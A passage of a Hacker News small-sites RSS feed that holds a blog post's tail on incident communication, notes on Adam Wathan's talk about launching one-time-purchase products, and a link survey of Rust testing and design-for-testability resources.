<li>do not use this mailing list for marketing purposes, unless you want to offload the burden of keeping the list up to date to the marketing department.</li>
<li>do make sure when you gain or lose clients you keep this up to date</li>
</ul>
</li>
<li>Run through a disaster in your mind and make notes on how you would communicate the issue, both internally and externally.&nbsp; How often do you update your team?&nbsp; How often do you update your clients?&nbsp; What about an internal issue (some of your code screwed up) vs an external issue.&nbsp; This doesn’t need to be exhaustive, but thinking about it ahead of time and making some notes will help you in the crisis.</li>
<li>Cost: free</li>
</ul>
</li>
</ul>
<p>All of this is probably a four hour project, max.</p>
<p>But once this is done, you’ll rest easier at night, knowing you have what you need to troubleshoot and recover from production issues.</p>
		              </div>
    </div>
    
</article><!-- #post-2312 -->

				
								

	<!-- #comments .comments-area -->
	
	
	

			
			
		</div><!-- #primary .content-area -->

<!-- #secondary .widget-area -->
		</div><!--  .row -->
            
	</div><!-- #main .site-main -->

	<!-- #colophon .site-footer -->
</div></div>]]>
            </description>
            <link>http://www.mooreds.com/wordpress/archives/2312</link>
            <guid isPermaLink="false">hacker-news-small-sites-24953449</guid>
            <pubDate>Sat, 31 Oct 2020 17:36:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4D Imaging through Spray-On Optics (2017) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24953444">thread link</a>) | @tosh
<br/>
October 31, 2020 | https://light.cs.uni-bonn.de/papers/IseringhausenEtAl-SprayOn4D-SIGGRAPH2017.pdf | <a href="https://web.archive.org/web/*/https://light.cs.uni-bonn.de/papers/IseringhausenEtAl-SprayOn4D-SIGGRAPH2017.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://light.cs.uni-bonn.de/papers/IseringhausenEtAl-SprayOn4D-SIGGRAPH2017.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24953444</guid>
            <pubDate>Sat, 31 Oct 2020 17:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Nailing Your First Launch by Adam Wathan]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24953270">thread link</a>) | @vitabenes
<br/>
October 31, 2020 | https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/ | <a href="https://web.archive.org/web/*/https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>I’ve just watched the talk «Nailing Your First Launch» (MicroConf Starter 2018) by Adam Wathan and I
took notes that I’d like to share and re-visit them in the future. Some of them are just text from his screens, some thoughts are mine.</p>
<p>But don’t let me steal the video from you by providing a digested summary.
In my humble opinion, the main idea of watching talks or reading something is to change your mind
model of seeing this topic.
Don’t hesitate and start watching the video before proceeding to notes.
The notes are here just to come back from time to time and re-call some especially useful highlights.</p>
<p><a href="https://www.youtube.com/watch?v=ajrDxZRpP9M">https://www.youtube.com/watch?v=ajrDxZRpP9M</a></p>
<hr>

<h3 id="one-time-purchase-products-are-way-easier-to-sell">One-time purchase products are way easier to sell</h3>
<ul>
<li>Harder to convince people that for $9 dollars per month they’d have value.</li>
<li>But it’s a very frequent case when people buy $100 courses and don’t even watch them.</li>
<li>One-time payments are much easier to go away with.</li>
</ul>
<h3 id="they-can-be-done">They can be “done”</h3>
<ul>
<li>You don’t have to maintain them forever.</li>
<li>A course can be finished. A book can be finished.</li>
</ul>
<h3 id="you-can-put-one-together-in-3-months-of-nights-and-weekends">You can put one together in 3 months of nights and weekends</h3>
<ul>
<li>Easier to plan.</li>
</ul>
<h3 id="they-put-money-in-the-bank-fast-then-drop-off-opposite-to-saas">They put money in the bank fast then drop off (opposite to SAAS)</h3>
<ul>
<li>One-time projects do have a more clear cliff of death, but they produce more money than saas during
launch days.</li>
</ul>
<hr>

<h3 id="building-an-audience">Building an audience</h3>
<ul>
<li>
<p>Having a big audience can compensate for almost any mistake made in marketing/sales.</p>
</li>
<li>
<p>Huge audience + bad sales plan produces way more profit than no audience + good sales plan.</p>
</li>
<li>
<p>Produce blog posts, tutorials, podcasts, screencasts, interview people</p>
</li>
<li>
<p>You should be worth following (provide a value for your audience)</p>
</li>
<li>
<p>Help people where they already are (Wes Bos)</p>
</li>
<li>
<p>Specific tactics for tech guys: tweet your hacks (like some tricks with css) that save you time.</p>
</li>
</ul>
<h3 id="picking-the-right-idea">Picking the right idea</h3>
<ul>
<li>Have an idea
<ul>
<li>what are you already putting out there that peoeple seem excited about?</li>
<li>what are you excited about that you think others will get excited about?</li>
<li>what do people think you’re better at than they are?</li>
<li>what have you learned outside your community would benefit from?</li>
<li>what did you have to figure out yourself but was really helpful to learn?</li>
</ul>
</li>
<li>Test it
<ul>
<li>
<p>«First thing to do is to put a landing page and start emailing.»</p>
<p>It’s not a bad way, but it’s not the first thing that you should do.
Especially it doesn’t work if you have no audience. People wouldn’t trust you.</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Collect feedback from tweets, have a catalog of them. Can be used later for your landing/sales pages.</p>
</blockquote>
<h3 id="define-the-product">Define the product</h3>
<ul>
<li>Plan small, it will end up bigger than you think anyway
<ul>
<li>Don’t worry about size. A short book is still a book.</li>
<li>3 hours of a video course is plenty.</li>
<li>Actually, not everyone is looking for a full knowledge base on a specific topic and read
500 pages on that. Collection of great ideas (like tweets) on that specific topic works
too.</li>
</ul>
</li>
</ul>
<blockquote>
<p>In general, courses are easier to sell at higher prices because people expect products such as
books to be in a specific cost range, even if they understand that it brings a high value.</p>
</blockquote>
<h3 id="landing-page">Landing page</h3>
<p>The goal is to collect e-mail addresses.</p>
<p>Example of Adam’s landing page can be seen on 19:33 - 22:25</p>
<ul>
<li>Promise something in advance (sign up for free screencasts and a big discount)</li>
<li>You can put your catalog of feedback on your landing page to earn more trust.</li>
</ul>
<h3 id="pre-sell">Pre-sell</h3>
<h4 id="advantages">Advantages</h4>
<ul>
<li>Best form of product validation</li>
<li>You’ll make more money</li>
<li>More motivation to finish</li>
<li>Can buy you the time to focus on the product</li>
</ul>
<h4 id="disadvantages">Disadvantages</h4>
<ul>
<li>Selling multiple tiers is trickier</li>
<li>Can’t easily change scope</li>
<li>Like taking on debt, can be extremely stressful. People paid you 50k$ and you have to return
it as the value in N months. (impostor syndrome?)</li>
</ul>
<h3 id="building-your-email-list">Building Your Email List</h3>
<ul>
<li>Always tell your audience.</li>
</ul>
<blockquote>
<p>Announce the announcement — «about to announce the next big project I’m working on; if you check
it out and are excited about it, I’d love any help spreading the word!»</p>
</blockquote>
<ul>
<li>Share progress. Send an update every week or so.</li>
<li>Repurpose content (Take a chapter from a book, make it a blog post and share it)</li>
</ul>
<h3 id="getting-it-finished">Getting it finished</h3>
<p>A few strategies to finally finish it:</p>
<ul>
<li>Make promises («this week I’m going to deliver a screencast»)</li>
<li>Email on a schedule</li>
<li>Reduce scope. (the project/book gets bigger and bigger, the best way to cross the finish line</li>
</ul>
<h3 id="figuring-pricing">Figuring pricing</h3>
<ul>
<li>It’s hard to sell tiers during pre-sales.</li>
<li>Sell pre-orders with top tier price.</li>
</ul>
<h4 id="single-tier">Single tier</h4>
<ul>
<li>Can be fine if you can charge enough</li>
<li>Often necessary if pre-selling</li>
<li>Nice if you can’t figure out a way to add additional tiers that actually feel valuable</li>
<li>In general, prefer multiple tiers</li>
</ul>
<h4 id="two-tiers">Two tiers</h4>
<ul>
<li>Usually a price anchoring strategy, first tier makes second tier look like better deal</li>
<li>Second tier is usually the “real” product</li>
<li>Prices are often close-ish, maybe 1x and 1.5x</li>
<li>Works well with video courses where easy to cut content for budget version</li>
</ul>
<h4 id="three-tiers">Three tiers:</h4>
<ul>
<li>Great for books if you can come up with the bonus content (videos?)</li>
<li>Makes it easier to evaluate as its own product instead of compring to Amazon book prices</li>
<li>Prices are usually 1x, ~2x, ~5x</li>
<li>This will make you a lot more money from a book than just selling the book on its own</li>
</ul>
<blockquote>
<p><strong>Adam’s case</strong></p>
<ul>
<li>First tier: The Bare Essentials, $39
<ul>
<li>The 158-page book in pdf format</li>
<li>Comprehensive set of exercises</li>
</ul>
</li>
<li>Second tier: The Premium Training Package, $79
<ul>
<li>Over 4 hours of screencasts, covering all of the book examples</li>
<li>Three additional advanced tutorials</li>
</ul>
<ul>
<li>all from first tier</li>
</ul>
</li>
<li>Third tier: The complete Reference Package, $179
<ul>
<li>The source code of Nitpick CI, a production Laravel application that makes heavy
use of collection pipelines</li>
</ul>
<ul>
<li>all from second tier</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="launch-discounts">Launch discounts</h3>
<ul>
<li>Discount it by enough to be appealing, at least 30%</li>
<li>Use stepped discounts; lower discount on cheaper tiers and better discount on higher tiers</li>
<li>Reverse engineer non-discounted price from your planned discounted price, it’ll help you charge more</li>
</ul>
<h3 id="nailing-the-launch">Nailing the launch</h3>
<ul>
<li>
<p>Build the sales page 39:13</p>
<ul>
<li>Still include an email sign up that sends preview content for new traffic (sign up to get
four free preview lessons)</li>
<li>Testimonials and social proof are important; use feedback from preview content to start</li>
<li>Sort tiers from highest price to lower price, use visuals to communicate value of higher
tiers (ui/ux hacks, make more important text bold, more physical things on a picture)</li>
</ul>
</li>
<li>
<p>Announce the launch details</p>
<ul>
<li>Include all package and pricing details</li>
<li>Complete TOC or content list</li>
<li>Final free content preview if possible</li>
</ul>
</li>
<li>
<p>Launch it</p>
<ul>
<li>Easiest part. Send an email — “xxx is now available!”, include discount</li>
<li>Launch on tuesday, no evidence, but it seems at least as good as any other day for Adam</li>
<li>Morning EST works well too</li>
</ul>
</li>
<li>
<p>Leverage early feedback</p>
<ul>
<li>Collect and catalog feedback after the launch.</li>
<li>Send new reviews to other people who hasn’t bought the course/book yet. Send them preview
of another chapter.</li>
</ul>
</li>
<li>
<p>Closing the launch</p>
<ul>
<li>Close the discount. Announce closing it. (“Hey, this is the last week of the launch”)</li>
<li>But don’t specify a closing date in advance</li>
</ul>
</li>
</ul>
<hr>
<h3 id="links">Links</h3>
<ul>
<li><a href="https://gist.github.com/adamwathan/30dc4230ac575cfa3425b39ca11ea859">Gist with useful links by Adam</a></li>
<li><a href="https://twitter.com/adamwathan">Twitter: @adamwathan</a></li>
<li><a href="https://adamwathan.me/">Blog: adamwathan.me</a></li>
<li><a href="https://www.youtube.com/watch?v=ajrDxZRpP9M">Talk on youtube</a></li>
</ul>
<p>
    Follow me on Twitter:
    <a target="_blank" href="https://twitter.com/reconquestio">@reconquestio</a>
    </p>

    <hr>
    <b>Comments</b>
    
    
</article>

        </div></div>]]>
            </description>
            <link>https://samizdat.dev/notes-on-nailing-your-first-launch-by-adam-wathan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24953270</guid>
            <pubDate>Sat, 31 Oct 2020 17:20:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust Design-for-Testability: A Survey]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24952378">thread link</a>) | @ytausky
<br/>
October 31, 2020 | https://alastairreid.github.io/rust-testability/ | <a href="https://web.archive.org/web/*/https://alastairreid.github.io/rust-testability/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>What can we do when designing Rust code to make it easier to test?
This is a survey of everything I could find<sup id="fnref:survey-method" role="doc-noteref"><a href="#fn:survey-method">1</a></sup> about
testing Rust with a particular focus on design for testability for
correctness.  Some of the articles show multiple things to do on a
worked example, some are more focused on a particular trick.</p>

<p>There doesn’t seem to be a single place that describes all the testing
ideas: it is scattered across book chapters, blog articles, medium
articles, etc. but here are the main sources that I have found.</p>

<ul>
  <li><a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">The Rust book</a> chapter on testing</li>
  <li><a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing command line applications in Rust</a>
(significant overlap with the <a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>)</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>
Probably the most exhaustive / thorough</li>
  <li><a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync at Dropbox</a> –
what they did in their Rust rewrite to improve testability</li>
  <li><a href="https://doc.rust-lang.org/stable/rust-by-example/testing.html">Rust by example book</a> chapter on testing</li>
  <li><a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a> –
John Regehr’s blog (not specifically about Rust)</li>
  <li><a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design in Rust</a></li>
  <li><a href="https://knowitlabs.no/rust-2020-testing-4ab3d80112ba">Rust 2020: Testing</a></li>
  <li><a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">How to use the Rust compiler as your integration testing framework</a></li>
  <li><a href="https://github.com/rust-unofficial/awesome-rust#testing">Awesome Rust: Testing</a> (collection of links)</li>
  <li><a href="https://blog.logrocket.com/how-to-write-crap-rust-code/">Writing Correct, Readable and Performant (CRaP) Rust code</a></li>
  <li><a href="https://blog.cyplo.dev/posts/2018/09/rust-testing-tricks/">Rust testing tricks</a></li>
  <li><a href="https://github.com/rust-unofficial/awesome-rust#testing">Awesome Rust: testing tools/libraries</a></li>
  <li><a href="https://martinfowler.com/articles/practical-test-pyramid.html">A practical test pyramid</a> – Martin Fowler’s blog (not specifically about Rust)</li>
</ul>

<p>I am not going to try to summarize what these sources say: the rest of
this post is a list of some common / interesting topics and which of
these sources describe it in more detail.</p>

<p>Although my main focus is on how to write Rust programs so that they are easy
to test, I touch on the other half of the problem: how to do the testing.</p>

<p><em>[I am new to Rust and my own testing habits are somewhat ad-hoc so this is
definitely not a recommendation of how to write software by me.  I hope it is
useful and that you will tell me what I have missed
<a href="https://twitter.com/alastair_d_reid">on twitter</a> or
<a href="mailto:alastair.d.reid@gmail.com">by email</a>
so that I can update this post.
I would love to hear about any team that has published recommendations for
design-for-testability.]</em></p>

<h2 id="design-techniques-for-improving-testability">Design techniques for improving testability</h2>

<p>The sources listed above have a bunch of common suggestions that I
explore in more detail below. Many of the sources I found have great
discussions so I will not try to repeat their explanations in this
document but will link to some of the better discussions of each idea
that I found.</p>

<h3 id="use-intermediate-data-structures">Use intermediate data structures</h3>

<p>See:
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a>,
<a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">use the Rust compiler for integration testing</a></p>

<ul>
  <li>Use intermediate data structures to separate deciding what to do
from performing the action: allowing tests to check that the right
decision is being made and avoiding the need to mock/fake the
filesystem, etc.</li>
  <li>Aggressively use newtypes, structs, enums</li>
  <li>Parse and validate inputs early (eg convert strings to enums)</li>
  <li>Also, #[must_use], parse/validate early</li>
  <li><a href="https://sans-io.readthedocs.io/how-to-sans-io.html">Writing I/O-Free (Sans-I/O) Protocol Implementations</a> (not Rust specific)</li>
</ul>

<h3 id="abstract-testable-code-into-separate-functions">Abstract testable code into separate functions</h3>

<p>See:
<a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a></p>

<ul>
  <li>Cleanly separate command line parsing from code that implements functionality</li>
</ul>

<h3 id="abstract-io-and-state-side-effects-out-of-functions">Abstract I/O and state side effects out of functions</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a>,
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a></p>

<ul>
  <li>Use of std::io::Write trait and writeln! instead of println! (and handle resulting potential error)</li>
</ul>

<h3 id="avoid--reduce-non-determinism">Avoid / reduce non-determinism</h3>

<p>See:
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a>,
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li>Use Futures with a custom executor to eliminate the
non-determinism of threads</li>
  <li>All randomized testing systems should be fully deterministic
and easily reproducible</li>
  <li>Beware of additional randomness in libraries:
e.g., Rust’s HashMap uses randomized hashing to protect against denial of service attacks.
This makes testing harder.</li>
  <li>Determinism enables minimization of random tests
(cf. <a href="https://altsysrq.github.io/proptest-book/proptest/tutorial/shrinking-basics.html">proptest</a>)</li>
</ul>

<h3 id="defining-correct-behavior">Defining correct behavior</h3>

<p>See:
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li><a href="https://blog.regehr.org/archives/856">Oracles for random testing</a> (not Rust specific)
    <ul>
      <li>Use Function inverse pairs (eg print/parse functions)</li>
      <li>Compare two implementations</li>
    </ul>
  </li>
  <li>Use asserts liberally</li>
  <li><a href="https://doc.rust-lang.org/nightly/unstable-book/compiler-flags/sanitizer.html">Turn on sanitizers</a></li>
  <li><a href="https://docs.rs/contracts/0.6.0/contracts/">Contracts.rs</a>
/ <a href="https://crates.io/crates/contracts">(crates.io link)</a> – code contract library</li>
  <li>[inactive?] <a href="https://github.com/nrc/libhoare">libhoare</a> compiler plugin</li>
</ul>

<h3 id="dependency-injection-and-mock-testing">Dependency injection and mock testing</h3>

<p>See:
<a href="https://knowitlabs.no/rust-2020-testing-4ab3d80112ba">Rust 2020: Testing</a>,
<a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design in Rust</a></p>

<ul>
  <li>Abstraction can be based on Higher order functions or objects</li>
  <li>Traits and <a href="https://github.com/asomers/mockall">mockall</a></li>
  <li>Module mocks using <a href="https://github.com/CodeSandwich/Mocktopus">mocktopus</a></li>
  <li><a href="https://github.com/Mcat12/shaku">shaku</a> is a compile-time dependency injection library that works well with mockall</li>
</ul>

<h3 id="api-design">API design</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>,
<a href="http://erickt.github.io/blog/2015/09/22/if-you-use-unsafe/">If you use Unsafe, …</a>,
<a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design</a>,
<a href="https://blog.logrocket.com/how-to-write-crap-rust-code/">Writing Correct, Readable and Performant (CRaP)</a></p>

<p>API design strongly affects testability of that API</p>

<ul>
  <li>The component should provide a stable contract composed of traits, structs, and enums</li>
  <li>Always implement Clone and fmt::Debug for public types
    <ul>
      <li>types like failure::Error should be converted to something that is cloneable</li>
    </ul>
  </li>
  <li>
    <p>Use ‘newtype’ to let the type system statically test for errors and use
one of these to test that this is done correctly</p>

    <ul>
      <li><a href="https://github.com/laumann/compiletest-rs">compiletest.rs</a>
for testing Rust compilations</li>
      <li><a href="https://github.com/dtolnay/trybuild">trybuild</a>
for testing error messages (eg from proc-macros)</li>
      <li><a href="https://crates.io/crates/lang_tester/">lang_tester</a>
for testing compilations including, but not limited to, Rust</li>
      <li>the fuzzy text matcher <a href="https://crates.io/crates/fm">fm</a></li>
    </ul>
  </li>
  <li>Use #![warn(missing_doc_code_examples)]
(and other <a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>)</li>
</ul>

<h2 id="writing-tests">Writing tests</h2>

<p>See:
<a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://doc.rust-lang.org/stable/rust-by-example/testing.html">Rust by example</a>,</p>

<p>Having structured your software to enable tests, there are a lot of
different tools and libraries to support writing tests.</p>

<ul>
  <li>Documentation tests</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a></li>
  <li><a href="https://rust-fuzz.github.io/book/">Fuzzing book</a> describes use of
    <ul>
      <li><a href="https://rust-fuzz.github.io/book/cargo-fuzz.html">cargo-fuzz</a></li>
      <li><a href="https://github.com/rust-fuzz/afl.rs">afl.rs</a></li>
      <li><a href="https://crates.io/crates/arbitrary">arbitrary</a></li>
    </ul>

    <p>See: <a href="https://github.com/rust-fuzz">Rust Fuzzing Authority</a></p>
  </li>
  <li>Use a generative testing / property-based testing crate such as
    <ul>
      <li><a href="https://docs.rs/quickcheck">QuickCheck</a>
        <ul>
          <li>has its own
<a href="https://docs.rs/quickcheck/0.9.2/quickcheck/trait.Arbitrary.html">arbitrary implementation</a></li>
        </ul>
      </li>
      <li><a href="https://docs.rs/proptest">proptest</a>
        <ul>
          <li>has its own
<a href="https://docs.rs/proptest-arbitrary/0.2.2/proptest_arbitrary/">arbitrary implementation</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Unit tests vs integration tests</li>
  <li>Using <a href="https://docs.rs/assert_cmd">assert_cmd</a> crate to test applications
(link has links to other useful crates)</li>
  <li>Better error reporting using one of
    <ul>
      <li><a href="https://docs.rs/anyhow/1.0.33/anyhow/">anyhow crate</a> – adding context to error messages</li>
      <li><a href="https://docs.rs/color-eyre/0.5.6/color_eyre/">color eyre crate</a> –
extends anyhow with .suggestion() and other context</li>
    </ul>
  </li>
  <li>Use the {:?} and {:x?} Debug string formats in test harnesses
(see <a href="https://doc.rust-lang.org/std/fmt/#formatting-traits">std/fmt</a>)</li>
  <li><a href="https://github.com/jakubadamw/rutenspitz">Rutenspitz</a>:
procedural macros for testing (fuzzing) equivalence of two
stateful models (e.g., data structures)</li>
</ul>

<h3 id="test--behavior-driven-design-tdd-and-bdd">Test / Behavior driven design (TDD and BDD)</h3>

<p>See: <a href="https://blog.cyplo.dev/posts/2018/09/rust-testing-tricks/">Rust testing tricks</a>,
<a href="https://mateuscosta.me/testing-between-java-and-rust">From @test to #[test]: Java to Rust</a></p>

<p>Obviously, there are many, many articles about TDD, BDD, Agile, etc.
in the context of Java and other OO languages. The following links are
Rust specific but they are a bit random and need to be improved.</p>

<ul>
  <li><a href="https://crates.io/crates/laboratory">Laboratory.rs</a> –
BDD-inspired test library (todo: are other BDD libraries maybe more popular?)</li>
  <li><a href="https://github.com/utkarshkukreti/speculate.rs">Speculate</a>
RSpec inspired testing library</li>
  <li>Fluent assertions: <a href="https://github.com/cfrancia/spectral">spectral</a>
(last updated 2017)</li>
  <li><a href="https://matthewkmayer.github.io/blag/public/post/tdd-with-rust/">TDD with Rust</a> (2017) –
a small example</li>
  <li>Regression testing (testing against a golden reference) using one of
    <ul>
      <li><a href="https://docs.rs/qtrac-retest/4.0.6/retest/">Retest</a></li>
      <li><a href="https://github.com/mitsuhiko/insta">insta</a></li>
    </ul>
  </li>
</ul>

<h2 id="specific-topics">Specific topics</h2>

<p>Note: links in this section are more likely to be out of date.</p>

<h3 id="code-coverage">Code coverage</h3>

<ul>
  <li><a href="https://crates.io/crates/cov-mark">cov-mark crate</a> –
adding explicit coverage annotations to code
(<a href="https://matklad.github.io/2018/06/18/a-trick-for-test-maintenance.html">blog</a>,
<a href="https://ferrous-systems.com/blog/coverage-marks/">blog</a>)</li>
  <li>Code coverage tools and crates
    <ul>
      <li><a href="https://github.com/mozilla/grcov">Grcov</a> – Mozilla’s coverage tool</li>
      <li><a href="https://github.com/kennytm/cov">cargo-cov</a></li>
      <li><a href="https://crates.io/crates/cargo-tarpaulin">Tarpaulin</a> (x86 only)</li>
    </ul>
  </li>
  <li><a href="https://jbp.io/2017/07/19/measuring-test-coverage-of-rust-programs.html">Measuring test coverage of Rust programs</a>
(I think it is now easier than in 2017?)</li>
  <li><a href="https://sunjay.dev/2016/07/25/rust-code-coverage">Rust Code Coverage Guide: kcov + Travis CI + Codecov / Coveralls</a> (2016)</li>
</ul>

<h3 id="testing-embedded-systems">Testing embedded systems</h3>

<ul>
  <li><a href="https://ferrous-systems.com/blog/cargo-test-with-panic-probe/">Using <code>cargo test</code> for embedded testing with <code>panic-probe</code></a></li>
  <li><a href="https://ferrous-systems.com/blog/defmt/">defmt, a highly efficient Rust logging framework for embedded devices</a>:
a deferred formatting library that encodes I/O over a hardware trace port to reduce binary size on embedded systems</li>
  <li><a href="https://medium.com/@ericdreichert/test-setup-and-teardown-in-rust-without-a-framework-ba32d97aa5ab">Test setup/teardown without a framework</a> –
using <a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html">panic::catch_unwind</a></li>
  <li><a href="https://github.com/rust-lang/rfcs/blob/master/text/2318-custom-test-frameworks.md">RFC 2318: Custom test frameworks</a> –
<a href="https://doc.rust-lang.org/beta/unstable-book/language-features/custom-test-frameworks.html">now in unstable</a></li>
  <li><a href="https://os.phil-opp.com/testing/">Writing an OS in Rust: testing</a> (uses custom test frameworks)</li>
  <li><a href="https://github.com/japaric/utest">Utest</a> (is this still active?)</li>
</ul>

<h3 id="concurrency-futures-and-async">Concurrency, futures and async</h3>

<ul>
  <li><a href="https://blog.x5ff.xyz/blog/async-tests-tokio-rust/">Two easy ways to test async functions in Rust</a></li>
  <li><a href="https://rust-lang.github.io/async-book/09_example/03_tests.html">Async book – testing a web server</a></li>
  <li><a href="https://crates.io/crates/tokio-test">Tokio-test</a> for mocking AsyncRead/Write and tasks
(<a href="https://docs.rs/tokio-test/0.3.0/tokio_test/index.html">docs</a>)</li>
  <li><a href="https://github.com/actix/examples/blob/master/hello-world/src/main.rs">actix async example</a></li>
  <li><a href="https://www.lpalmieri.com/posts/2020-08-09-zero-to-production-3-how-to-bootstrap-a-new-rust-web-api-from-scratch/#4-our-first-integration-test">Our first integration test</a> –
Actix_rt::test based chapter in book <a href="https://zero2prod.com/">Zero to production in Rust (book)</a></li>
  <li><a href="https://crates.io/crates/loom">Loom</a> tests concurrent code by
running it many times with all possible thread interleavings</li>
</ul>

<h3 id="testing-frameworks">Testing frameworks</h3>

<ul>
  <li><a href="https://tech.labs.oliverwyman.com/blog/2019/01/14/serialising-rust-tests/">Serializing Rust tests</a>
(<a href="https://github.com/palfrey/serial_test">github</a>) –
annotations to prevent some tests being run in parallel</li>
  <li><a href="https://github.com/budziq/rust-skeptic">Skeptic</a> –
run doctest-like tests on README.md</li>
  <li><a href="https://github.com/Wmaxlees/trust">Trust automated test runner</a>: reruns tests when files change</li>
  <li><a href="https://crates.io/crates/test-case">Test-case</a>
procedural macro to generate tests from test-case annotations</li>
  <li><a href="https://github.com/vitiral/artifact">Artifact (aka RST)</a> –
requirement tracking software where comments in code are linked (in lightweight way) to
requirements, specs and tests in a markdown document</li>
  <li><a href="https://github.com/cksac/fake-rs">Fake.rs</a> –
interesting #derive option to describe how to generate fake values for structs.
Can this be adapted to specify invariants for legal values of a type?</li>
</ul>

<h3 id="testing-guis">Testing GUIs</h3>

<ul>
  <li><a href="https://gtk-rs.org/blog/2018/05/02/who-talked-about-testing.html">Gtk-rs testing</a>:
testing UIs by being able to send events to gtk and observe results</li>
  <li><a href="https://medium.com/snips-ai/dinghy-painless-rust-tests-and-benches-on-ios-and-android-c9f94f81d305">Dinghy: testing iOS and Android</a>:
challenges when you don’t have a command line</li>
</ul>

<h3 id="testing-apis">Testing APIs</h3>

<ul>
  <li><a href="https://github.com/laumann/compiletest-rs">Compiletest.rs</a> – for testing compiler plugins and similar
    <ul>
      <li>In particular, checking that type system (etc) rejects misuse of APIs:
<a href="http://erickt.github.io/blog/2015/09/22/if-you-use-unsafe/">If you use unsafe …</a></li>
    </ul>
  </li>
  <li><a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>
(not so much about testing here – but useful)</li>
</ul>

<h3 id="mutation-testing">Mutation testing</h3>

<ul>
  <li><a href="https://github.com/llogiq/mutagen">Mutagen</a> –
mutation testing tool implemented using procedural macros</li>
</ul>

<h3 id="test-generation">Test generation</h3>

<ul>
  <li><a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">Writing a testcase generator for a programming language</a>
Generate random wasm with “wasm-smith” in Rust</li>
</ul>

<h3 id="mocking-libraries">Mocking libraries</h3>

<p>There are <em>a lot</em> of mocking / faking libraries – this is a limited
list of what I found.</p>

<ul>
  <li><a href="https://asomers.github.io/mock_shootout/">Rust mock shootout</a>:
a fairly thorough survey of Rust mocking libraries.
This lead to the development of
<a href="https://github.com/asomers/mockall">mockall</a>
that is one of (the?) most popular mocking library.</li>
  <li><a href="https://github.com/asomers/mockall">mockall</a> mocking library</li>
  <li><a href="https://github.com/CodeSandwich/Mocktopus">mocktopus</a></li>
  <li><a href="https://docs.rs/httpmock/0.5.0/httpmock/">Httpmock</a></li>
  <li><a href="https://lib.rs/crates/partial-io">Partial-io</a>
wraps Read/Write implementations, optional Future and quickcheck support</li>
</ul>

<h3 id="error-handling">Error handling</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/errors.html">CLI applications in Rust</a>,
<a href="https://nick.groenen.me/posts/rust-error-handling/">Structuring and using errors in 2020</a></p>

<p>Not quite about testing – but semi-relevant.</p>

<ul>
  <li>Use of ?</li>
  <li><a href="https://docs.rs/anyhow/1.0.33/anyhow/">Anyhow</a> – adding context to error messages</li>
  <li><a href="https://blog.yoshuawuyts.com/error-handling-survey/">Error handling survey</a></li>
</ul>

<h3 id="misc">Misc</h3>

<ul>
  <li>kruetz on reddit
<a href="https://www.reddit.com/r/rust/comments/jl2xlg/rust_designfortestability_a_survey/ganb86b?utm_source=share&amp;utm_medium=web2x&amp;context=3">described how he checks that code in mdbooks compiles correctly</a></li>
</ul>

<h2 id="more-information">More information</h2>
</div></div>
